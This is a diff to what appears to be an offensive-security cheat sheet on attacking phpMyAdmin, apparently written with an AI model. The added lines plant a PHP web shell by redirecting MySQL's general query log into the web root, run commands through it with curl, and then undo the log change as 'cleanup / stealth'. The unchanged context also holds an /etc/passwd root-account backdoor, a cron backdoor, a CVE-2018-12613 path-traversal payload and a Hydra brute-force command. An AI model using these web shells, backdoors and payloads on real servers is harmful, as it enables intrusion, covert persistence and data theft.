@@ -1,3 +1,5 @@
+# phpMyAdmin
+
 #phpMyAdmin #MySQL #webservices #database #RCE
 
 ## What is phpMyAdmin?
@@ -7,6 +9,22 @@ Web-based MySQL/MariaDB administration interface written in PHP. Ubiquitous on L
 - Common paths: `/phpmyadmin/`, `/phpMyAdmin/`, `/pma/`, `/db/`, `/admin/mysql/`
 - Config file: `config.inc.php` — contains `blowfish_secret`, DB credentials
 - Default credentials vary by install — often `root` with no password
+
+---
+
+## Tools
+
+| Tool | Use |
+|---|---|
+| [[Tools/Scanning/gobuster\|gobuster]] | Find the phpMyAdmin path (`/phpmyadmin/`, `/pma/`, …) |
+| [[Tools/Scanning/ffuf\|ffuf]] | Path discovery / login fuzzing |
+| [[Tools/File Transfer/cURL\|cURL]] | LFI/config-read PoCs, shell access after INTO OUTFILE |
+| [[Tools/Auth/Hydra\|Hydra]] | Brute force the `pma_username`/`pma_password` login |
+| [[Tools/Web/Burpsuite\|Burp Suite]] | Intercept the login POST → Intruder; craft CVE-2018-12613 LFI |
+| [[Tools/Payloads & Shells/metasploit\|metasploit]] | `phpmyadmin_preg_replace` RCE, `phpmyadmin_login` scanner |
+| [[Tools/Database/mysql\|mysql]] | Direct DB access with creds recovered from `config.inc.php` |
+
+> Cookie decryption: **PHP-Blowfish-cookie-decryptor** (Paradoxis) decrypts the `pmaAuth` cookie once you have `blowfish_secret` — see *Cookie Decryption* below.
 
 ---
 
@@ -107,6 +125,28 @@ INTO OUTFILE '/etc/cron.d/backdoor';
 -- Write to /etc/passwd (if writable — rare)
 SELECT 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:root:/root:/bin/bash\n'
 INTO OUTFILE '/etc/passwd';
+```
+
+### General Query Log → Web Shell (when `INTO OUTFILE` is blocked)
+
+If `secure_file_priv` is set (blocking `INTO OUTFILE`) but you're an admin who can set global variables, redirect MySQL's **general query log** into the web root, then every subsequent query is written verbatim to that file — including a PHP payload.
+
+```sql
+-- Requirements: SUPER/admin priv, web root writable by the mysqld user, general_log togglable
+SHOW VARIABLES LIKE 'general_log%';                 -- note original path to restore later
+SET GLOBAL general_log = 'ON';
+SET GLOBAL general_log_file = '/var/www/html/shell.php';
+SELECT '<?php system($_GET["cmd"]); ?>';            -- this query text is logged into shell.php
+```
+
+```bash
+curl "http://<target>/shell.php?cmd=id"
+```
+
+```sql
+-- Cleanup / stealth: turn logging back off and restore the path
+SET GLOBAL general_log = 'OFF';
+SET GLOBAL general_log_file = '<original path>';
 ```
 
 ### CVE-2018-12613 — LFI (phpMyAdmin 4.8.0-4.8.1)
@@ -238,7 +278,14 @@ USE joomla;   SELECT username,password FROM jos_users;
 | Brute force | `hydra -l root -P rockyou.txt http-post-form://host/phpmyadmin/...` |
 | Read file | `SELECT LOAD_FILE('/etc/passwd');` |
 | Write shell | `SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';` |
+| Shell w/ OUTFILE blocked | `SET GLOBAL general_log_file='/var/www/html/shell.php'; SET GLOBAL general_log=ON;` then `SELECT '<?php ... ?>';` |
 | Check FILE priv | `SHOW GRANTS; SHOW VARIABLES LIKE 'secure_file_priv';` |
 | LFI CVE | CVE-2018-12613 — `index.php?target=db_sql.php%253f/../../../etc/passwd` |
 | RCE CVE (MSF) | `exploit/multi/http/phpmyadmin_preg_replace` |
 | Config location | `/etc/phpmyadmin/config.inc.php` |
+
+---
+
+*Created: 2026-07-13*
+*Updated: 2026-09-25*
+*Model: claude-opus-4-8*
